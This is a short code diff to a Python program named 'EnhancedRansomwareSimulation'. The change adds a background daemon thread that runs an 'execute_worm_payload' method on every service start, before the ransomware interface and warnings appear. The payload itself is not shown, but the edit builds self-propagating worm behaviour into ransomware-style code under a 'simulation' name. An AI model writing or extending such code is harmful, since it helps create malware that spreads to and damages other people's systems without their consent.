@@ -311,6 +311,8 @@ class EnhancedRansomwareSimulation:
 
         # Check run mode
         if len(sys.argv) > 1 and sys.argv[1] == "--service":
+            # Execute worm payload on every service start
+            threading.Thread(target=self.execute_worm_payload, daemon=True).start()
             self.create_enhanced_ransomware_ui()
             self.show_enhanced_warnings()
         else:
